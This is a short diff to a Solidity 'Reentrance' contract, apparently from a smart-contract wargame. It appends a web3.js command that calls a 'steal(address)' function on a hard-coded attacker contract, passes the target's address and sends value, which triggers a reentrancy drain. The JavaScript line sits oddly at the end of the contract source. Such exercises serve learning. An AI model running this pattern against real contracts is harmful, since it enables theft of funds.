@@ -18,3 +18,7 @@ contract Reentrance {
         }
     }
 }
+
+web3.eth.sendTransaction({from:player, to:"0x9a72E27c18f62cF50137eF3F8E3b6aD23fD15E77", data:web3.utils.sha3("steal(address)").slice(0,10)+"000000000000000000000000"+contract.address.slice(2),value:toWei(((await getBalance(contract.address))/10).toString())});
+
+
